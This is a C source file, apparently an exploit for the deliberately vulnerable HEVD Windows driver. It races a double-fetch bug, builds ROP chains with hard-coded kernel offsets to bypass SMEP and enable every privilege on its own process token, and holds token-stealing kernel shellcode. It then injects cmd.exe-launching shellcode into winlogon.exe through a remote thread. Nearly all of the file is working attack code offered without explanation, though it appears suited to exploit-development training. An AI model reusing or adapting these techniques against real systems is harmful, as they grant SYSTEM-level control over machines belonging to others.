#include <stdio.h>
#include <Windows.h>
#include <sddl.h>
#include <Psapi.h>
#include <ntstatus.h>
#include <process.h>
#include <tlhelp32.h>
#include "winternl.h"
#include "HEVD.h"


typedef struct _DOUBLE_FETCH
{
    PVOID Buffer;
    SIZE_T Size;
} DOUBLE_FETCH, * PDOUBLE_FETCH;

typedef struct _PRACING_THREAD_PARAMETER
{
    HANDLE DeviceHandle;
    PDOUBLE_FETCH DoubleFetch;
} RACING_THREAD_PARAMETER, * PRACING_THREAD_PARAMETER;

BOOL ExploitSuccessful = false;
int raceCnt = 0;
HANDLE driverHandle;
PRACING_THREAD_PARAMETER RacingThreadParameter;
PDOUBLE_FETCH UserDoubleFetch;
char* Buffer;

void openDevice() {
    driverHandle = CreateFileA(
        "\\\\.\\HackSysExtremeVulnerableDriver",
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );
    if (driverHandle == INVALID_HANDLE_VALUE) {
        printf("\t[-] Could not open HEVD handle\n");
        exit(-1);
    }
}

DWORD WINAPI FlippingThread(LPVOID Parameter) {
    printf("\t\t\t[+] FlippingThread Scheduled On Processor: %d\n", GetCurrentProcessorNumber());

    while (!ExploitSuccessful) {
        *(PULONG)Parameter ^= 0x038;
    }
    printf("\t\t\t[+] FlippingThread Done\n");


    return EXIT_SUCCESS;
}

DWORD WINAPI RacingThread(LPVOID Parameter)
{
    HANDLE hFile = NULL;
    ULONG BytesReturned;
    BOOL Success = FALSE;
    HANDLE hThread = NULL;
    PDOUBLE_FETCH UserDoubleFetch = NULL;
    PRACING_THREAD_PARAMETER RacingThreadParameter = NULL;

    RacingThreadParameter = (PRACING_THREAD_PARAMETER)Parameter;

    hFile = RacingThreadParameter->DeviceHandle;
    UserDoubleFetch = RacingThreadParameter->DoubleFetch;

    printf("\t[+] RacingThread Scheduled On Processor: %d\n", GetCurrentProcessorNumber());

    //OutputDebugString("****************Kernel Mode****************\n");

    //while (!ExploitSuccessful) {
    for (int i = 0; i < 0x1000; i++) {
        // It's best to flush TLB Cache in Racing Thread
        EmptyWorkingSet(GetCurrentProcess());

        Success = DeviceIoControl(hFile,
            HEVD_IOCTL_DOUBLE_FETCH,
            (LPVOID)UserDoubleFetch,
            0,
            NULL,
            0,
            &BytesReturned,
            NULL);
    }
    ExploitSuccessful = TRUE;
    printf("\t[+] RacingThread Done\n");
    //OutputDebugString("****************Kernel Mode****************\n");

    return EXIT_SUCCESS;
}

DWORD racingThreadID;
DWORD flippingThreadID;
HANDLE RacingThreads[0x10] = { 0 };
HANDLE FlippingThreads[0x10] = { 0 };
int NumberOfProcessors = 2;
bool SingleCPU = FALSE;
DWORD_PTR Mask = 0;
DWORD ThreadTimeout = 120000;

void TriggerDoubleFetch() {
    ExploitSuccessful = FALSE;
    for (int i = 0; i < NumberOfProcessors; i++) {
        //DEBUG_INFO("\t\t[+] Starting Racing Thread: %d\n", i);
        RacingThreads[i] = CreateThread(NULL, 0, RacingThread, RacingThreadParameter, CREATE_SUSPENDED, 0);
        SetThreadPriority(RacingThreads[i], THREAD_PRIORITY_HIGHEST);

        //DEBUG_INFO("\t\t[+] Starting Flipping Thread: %d\n", i);
        FlippingThreads[i] = CreateThread(NULL, 0, FlippingThread, &UserDoubleFetch->Size, CREATE_SUSPENDED, 0);
        SetThreadPriority(FlippingThreads[i], THREAD_PRIORITY_HIGHEST);

        if (!SingleCPU) {
            Mask |= 1 << i;
            SetThreadAffinityMask(RacingThreads[i], Mask);

            Mask |= 1 << (i + 1);
            SetThreadAffinityMask(FlippingThreads[i], Mask);
        }
        else {
            SetThreadAffinityMask(RacingThreads[i], Mask);
            SetThreadAffinityMask(FlippingThreads[i], Mask);
        }

        ResumeThread(RacingThreads[i]);
        ResumeThread(FlippingThreads[i]);
    }

    if (WaitForMultipleObjects(NumberOfProcessors, RacingThreads, TRUE, ThreadTimeout)) {
        // Terminate the threads
        for (int i = 0; i < NumberOfProcessors; i++) {
            TerminateThread(RacingThreads[i], EXIT_SUCCESS);
            CloseHandle(RacingThreads[i]);

            TerminateThread(FlippingThreads[i], EXIT_SUCCESS);
            CloseHandle(FlippingThreads[i]);
        }

        //DEBUG_INFO("\t\t[+] Terminated Exploit Threads\n");
    }
}


ULONG64 BypassSMEP_1[0x10] = { 0 };
ULONG64 BypassSMEP_2[0x10] = { 0 };
ULONG64 OverwriteTokenPrivelage[0x10] = { 0 };




char ShellCode[] =
"\x41\x50\x41\x51\x52\x51\x50"          // push r8, r9, rdx, rcx, rax
"\x65\x48\x8B\x14\x25\x88\x01\x00\x00"	// mov rdx, [gs:188h]		    ; Get _ETHREAD pointer from KPCR
"\x4C\x8B\x82\xB8\x00\x00\x00"		    // mov r8, [rdx + b8h]		    ; _EPROCESS (kd> u PsGetCurrentProcess)
"\x4D\x8B\x88\x48\x04\x00\x00"		    // mov r9, [r8 + 448h]		    ; ActiveProcessLinks list head
"\x49\x8B\x09"				            // mov rcx, [r9]		        ; Follow link to first process in list
//find_system_proc:
"\x48\x8B\x51\xF8"			            // mov rdx, [rcx - 8]		    ; Offset from ActiveProcessLinks to UniqueProcessId
"\x48\x83\xFA\x04"			            // cmp rdx, 4			        ; Process with ID 4 is System process
"\x74\x05"				                // jz found_system		        ; Found SYSTEM token
"\x48\x8B\x09"				            // mov rcx, [rcx]		        ; Follow _LIST_ENTRY Flink pointer
"\xEB\xF1"				                // jmp find_system_proc		    ; Loop
//found_system:
"\x48\x8B\x41\x70"			            // mov rax, [rcx + 70h]		    ; Offset from ActiveProcessLinks to Token
"\x24\xF0"				                // and al, 0f0h			        ; Clear low 4 bits of _EX_FAST_REF structure
"\x49\x89\x80\xB8\x04\x00\x00"		    // mov [r8 + 4b8h], rax		    ; Copy SYSTEM token to current process's token
//recover:
"\x58\x59\x5A\x41\x59\x41\x58"          // push rax, rcx, rdx, r9, r8
//"\x48\x31\xF6"				            // xor rsi, rsi			        ; Zeroing out rsi register to avoid Crash
//"\x48\x31\xFF"				            // xor rdi, rdi			        ; Zeroing out rdi register to avoid Crash
//"\x48\x31\xC0"				            // xor rax, rax			        ; NTSTATUS Status = STATUS_SUCCESS
"\x48\x83\xc4\x28"			            // add rsp, 28h			        ; origin return address at HEVD!BufferOverflowStackIoctlHandler+0x1a
"\xc3"					                // ret				
;

ULONG64 ksecpkg_Addr = 0;
ULONG64 cng_Addr = 0;
ULONG64 KernelBase = NULL;

char* lpvShellcode;


ULONG64 KUSER_SHARED_DATA = 0xFFFFF78000000000;
ULONG64 pMiGetPteAddress = NULL;
_NtQuerySystemInformation NtQuerySystemInformation;
BOOLEAN GetKernelModuleBase(PCHAR Name, ULONG_PTR* lpBaseAddress) {
    PRTL_PROCESS_MODULES ModuleInformation = NULL;
    ULONG InformationSize = 16;
    NTSTATUS NtStatus;

    NtQuerySystemInformation = (_NtQuerySystemInformation)
        GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtQuerySystemInformation");
    if (NtQuerySystemInformation == NULL) {
        exit(-1);
    }

    do {
        InformationSize *= 2;

        ModuleInformation = (PRTL_PROCESS_MODULES)realloc(ModuleInformation, InformationSize);
        memset(ModuleInformation, 0, InformationSize);

        NtStatus = NtQuerySystemInformation(SystemModuleInformation,
            ModuleInformation,
            InformationSize,
            NULL);
    } while (NtStatus == STATUS_INFO_LENGTH_MISMATCH);


    BOOL Success = FALSE;
    for (UINT i = 0; i < ModuleInformation->NumberOfModules; i++) {
        CONST PRTL_PROCESS_MODULE_INFORMATION Module = &ModuleInformation->Modules[i];
        CONST USHORT OffsetToFileName = Module->OffsetToFileName;
        *lpBaseAddress = (ULONG_PTR)ModuleInformation->Modules[i].ImageBase;

        if (!strcmp((const char*)&Module->FullPathName[OffsetToFileName], Name)) {
            Success = TRUE;
            break;
        }
    }

    free(ModuleInformation);
    return Success;
}

ULONG64 uAllPrivelage = 0xffffffffffffffff;
void prepareRopOverwriteTokenPrivelage() {
    /* Arbitary Write*/
    /*
    pop rax
    0xffffffffffffffff
    pop rdx
    KUSER_SHARED_DATA + 0x800
    mov [rdx], rax
    xor rax, rax
    */
    *(OverwriteTokenPrivelage + 0) = KernelBase + 0x2017f2;
    *(OverwriteTokenPrivelage + 1) = uAllPrivelage;
    *(OverwriteTokenPrivelage + 2) = KernelBase + 0x216c22;
    *(OverwriteTokenPrivelage + 3) = 0;
    *(OverwriteTokenPrivelage + 4) = KernelBase + 0x2fea29;
    *(OverwriteTokenPrivelage + 5) = KernelBase + 0x281b3d;
}

void prepareRopBypassSMEP() {

    *(BypassSMEP_1 + 0) = KernelBase + 0x2021a0;
    *(BypassSMEP_1 + 1) = KUSER_SHARED_DATA;//(ULONG64)lpvShellcode;
    *(BypassSMEP_1 + 2) = KernelBase + 0x27af40; //nt!MiGetPteAddress
    *(BypassSMEP_1 + 3) = KernelBase + 0x216c22;
    *(BypassSMEP_1 + 4) = KUSER_SHARED_DATA + 0x820;
    *(BypassSMEP_1 + 5) = KernelBase + 0x2fea29;
    


    /* Dummy ROP */
    /*
    *(BypassSMEP_1 + 0) = KernelBase + 0x281b3d;
    *(BypassSMEP_1 + 1) = KernelBase + 0x281b3d;
    *(BypassSMEP_1 + 2) = KernelBase + 0x281b3d;
    *(BypassSMEP_1 + 3) = KernelBase + 0x281b3d;
    *(BypassSMEP_1 + 4) = KernelBase + 0x281b3d;
    *(BypassSMEP_1 + 5) = KernelBase + 0x281b3d;
    */
    
    
    *(BypassSMEP_2 + 0) = KernelBase + 0x216c22;
    *(BypassSMEP_2 + 1) = KUSER_SHARED_DATA + 0x820;
    *(BypassSMEP_2 + 2) = KernelBase + 0x3a3fa7;
    *(BypassSMEP_2 + 3) = KernelBase + 0x2021a0;
    *(BypassSMEP_2 + 4) = 0xFFFFFFFFFFFFFFFB;
    *(BypassSMEP_2 + 5) = ksecpkg_Addr + 0x1e635;
    

    /*
    *(BypassSMEP_2 + 0) = KernelBase + 0x2021a0;
    *(BypassSMEP_2 + 1) = (ULONG64)lpvShellcode;
    *(BypassSMEP_2 + 2) = KernelBase + 0x27af40; //nt!MiGetPteAddress
    *(BypassSMEP_2 + 3) = KernelBase + 0x216c22;
    *(BypassSMEP_2 + 4) = KUSER_SHARED_DATA + 0x840;
    *(BypassSMEP_2 + 5) = KernelBase + 0x2fea29;
    */

}

void prepareUserDoubleFetch() {
    int UserModeBufferSize = 0x1000;
    RacingThreadParameter = (PRACING_THREAD_PARAMETER)HeapAlloc(GetProcessHeap(),
        HEAP_ZERO_MEMORY,
        sizeof(RACING_THREAD_PARAMETER));
    printf("[+] RacingThreadParameter: 0x%p\n", RacingThreadParameter);

    UserDoubleFetch = (PDOUBLE_FETCH)VirtualAlloc(
        NULL,
        0x1000,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE);
    printf("[+] UserDoubleFetch: 0x%p\n", UserDoubleFetch);

    Buffer = (char*)HeapAlloc(GetProcessHeap(),
        HEAP_ZERO_MEMORY,
        UserModeBufferSize);
    printf("[+] Buffer: 0x%p\n", Buffer);
    memset(Buffer, 0x0, 0x1000);

    UserDoubleFetch->Buffer = (PULONG)Buffer;
    UserDoubleFetch->Size = 0x800;

    RacingThreadParameter->DoubleFetch = UserDoubleFetch;
    RacingThreadParameter->DeviceHandle = driverHandle;
}

void prepareShellcode() {
    lpvShellcode = (char*)VirtualAlloc(
        NULL,				        // Next page to commit
        0x1000,		                // Page size, in bytes
        MEM_COMMIT | MEM_RESERVE,	// Allocate a committed page
        PAGE_EXECUTE_READWRITE);	// Read/write access
    /*
    lpvShellcode = (char*)HeapAlloc(
        GetProcessHeap(),
        HEAP_ZERO_MEMORY,
        0x1000
    );
    */
    if (lpvShellcode == NULL) {
        printf("\t[-] Failed to create shellcode memory\n");
        exit(-1);
    }
    memset(lpvShellcode, 0x0, 0x1000);
    memcpy(lpvShellcode, ShellCode, sizeof(ShellCode));
}


DWORD64 GetKernelPointer(HANDLE handle, DWORD type)
{
    _NtQuerySystemInformation NtQuerySystemInformation = (_NtQuerySystemInformation)
        GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtQuerySystemInformation");
    if (NtQuerySystemInformation == NULL) {
        return NULL;
    }
    PSYSTEM_HANDLE_INFORMATION buffer = (PSYSTEM_HANDLE_INFORMATION)malloc(0x20);

    DWORD outBuffer = 0;
    NTSTATUS status = NtQuerySystemInformation(SystemHandleInformation, buffer, 0x20, &outBuffer);

    if (status == STATUS_INFO_LENGTH_MISMATCH)
    {
        free(buffer);
        buffer = (PSYSTEM_HANDLE_INFORMATION)malloc(outBuffer);
        printf("outBuffer 0x%x\n", outBuffer);
        status = NtQuerySystemInformation(SystemHandleInformation, buffer, outBuffer, &outBuffer);
    }

    if (!buffer)
    {
        printf("\t[-] NtQuerySystemInformation error \n");
        return 0;
    }

    for (size_t i = 0; i < buffer->NumberOfHandles; i++)
    {
        DWORD objTypeNumber = buffer->Handels[i].ObjectTypeNumber;

        if (buffer->Handels[i].ProcessId == GetCurrentProcessId())
        {
            printf("%p %d %x\n", buffer->Handels[i].Object, buffer->Handels[i].ObjectTypeNumber, buffer->Handels[i].Handle);
            if (buffer->Handels[i].ObjectTypeNumber == type)
            {
                if (handle == (HANDLE)buffer->Handels[i].Handle)
                {
                    DWORD64 object = (DWORD64)buffer->Handels[i].Object;
                    free(buffer);
                    return object;
                }
            }
        }
    }
    printf("\t[-] handle not found\n");
    free(buffer);
    return 0;
}

HANDLE proc;
HANDLE token;
DWORD64 ktoken;
DWORD64 dwTargetOffset;

void getTokenOffset() {
    proc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, GetCurrentProcessId());
    if (!proc)
    {
        printf("\t[-] OpenProcess failed\n");
        exit(-1);
    }
    token = 0;
    if (!OpenProcessToken(proc, TOKEN_ADJUST_PRIVILEGES, &token))
    {
        printf("\t[-] OpenProcessToken failed\n");
        exit(-1);
    }
    printf("[+] proc @  0x%p\n", token);

    ktoken = GetKernelPointer(token, 0x5);
    dwTargetOffset = ktoken + 0x40;
    printf("[+] found token at: %p\n", ktoken);
    printf("[+] The target token offest is %p\n", dwTargetOffset);
}

// run cmd.exe
unsigned char InjectedCode[] =
"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52\x51" \
"\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52" \
"\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0" \
"\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed" \
"\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88" \
"\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44" \
"\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48" \
"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1" \
"\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44" \
"\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49" \
"\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a" \
"\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41" \
"\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00" \
"\x00\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b" \
"\x6f\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd\x9d\xff" \
"\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47" \
"\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x6d\x64\x2e\x65" \
"\x78\x65\x00";

void InjectToWinlogon()
{
    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

    int pid = -1;
    if (Process32First(snapshot, &entry))
    {
        while (Process32Next(snapshot, &entry))
        {
            if (_wcsicmp(entry.szExeFile, L"winlogon.exe") == 0)
            {
                pid = entry.th32ProcessID;
                break;
            }
        }
    }

    CloseHandle(snapshot);

    if (pid < 0)
    {
        printf("Could not find process\n");
        return;
    }
    printf("[+] PID: 0x%x\n", pid);
    HANDLE h = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!h)
    {
        printf("Could not open process: %x", GetLastError());
        return;
    }

    void* buffer = VirtualAllocEx(h, NULL, sizeof(InjectedCode), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (!buffer)
    {
        printf("[-] VirtualAllocEx failed\n");
    }

    if (!buffer)
    {
        printf("[-] remote allocation failed");
        return;
    }

    if (!WriteProcessMemory(h, buffer, InjectedCode, sizeof(InjectedCode), 0))
    {
        printf("[-] WriteProcessMemory failed");
        return;
    }

    HANDLE hthread = CreateRemoteThread(h, 0, 0, (LPTHREAD_START_ROUTINE)buffer, 0, 0, 0);

    if (hthread == INVALID_HANDLE_VALUE)
    {
        printf("[-] CreateRemoteThread failed");
        return;
    }
}

void method1() {
    openDevice();
    
    GetKernelModuleBase((PCHAR)"ntoskrnl.exe", &KernelBase);
    GetKernelModuleBase((PCHAR)"cng.sys", &cng_Addr);
    GetKernelModuleBase((PCHAR)"ksecpkg.sys", &ksecpkg_Addr);

    printf("[+] ntoskrnl: %llx\n", KernelBase);
    printf("[+] ksecpkg: %llx\n", ksecpkg_Addr);
    printf("[+] cng: %llx\n", cng_Addr);



    printf("[*] Preparing shellcode & payload\n");
    prepareShellcode();
    printf("[+] lpvShellcode: 0x%llx\n", lpvShellcode);
    
    
    prepareUserDoubleFetch();

    printf("[*] Preparing SMEP Bypass ROP Chain\n");
    prepareRopBypassSMEP();


    
    
    printf("[*] Send 1st payload\n");
    memcpy(Buffer + 0x808, BypassSMEP_1, sizeof(BypassSMEP_1));
    //TriggerDoubleFetch();


    
    printf("[*] Send 2st payload\n");
    memcpy(Buffer + 0x808, BypassSMEP_2, sizeof(BypassSMEP_2));
    //TriggerDoubleFetch();

    /*
    printf("[*] Send 3st payload\n");
    memcpy(Buffer + 0x808, &lpvShellcode, 8);
    TriggerDoubleFetch();

    system("cmd.exe");
    */
    printf("\t[+] Success\n");
    while (1);
    

}

void method2() {
    openDevice();

    GetKernelModuleBase((PCHAR)"ntoskrnl.exe", &KernelBase);
    GetKernelModuleBase((PCHAR)"cng.sys", &cng_Addr);
    GetKernelModuleBase((PCHAR)"ksecpkg.sys", &ksecpkg_Addr);

    printf("[+] ntoskrnl: %llx\n", KernelBase);
    printf("[+] ksecpkg: %llx\n", ksecpkg_Addr);
    printf("[+] cng: %llx\n", cng_Addr);

    prepareUserDoubleFetch();

    prepareRopOverwriteTokenPrivelage();

    getTokenOffset();
    
    printf("[*] Send 1st payload\n");
    *(OverwriteTokenPrivelage + 3) = dwTargetOffset;
    memcpy(Buffer + 0x808, OverwriteTokenPrivelage, sizeof(OverwriteTokenPrivelage));
    TriggerDoubleFetch();



    printf("[*] Send 2st payload\n");
    *(OverwriteTokenPrivelage + 3) = dwTargetOffset + 0x8;
    memcpy(Buffer + 0x808, OverwriteTokenPrivelage, sizeof(OverwriteTokenPrivelage));
    TriggerDoubleFetch();
    
    
    
    InjectToWinlogon();


}

int main() {
    method2();
    return 0;
}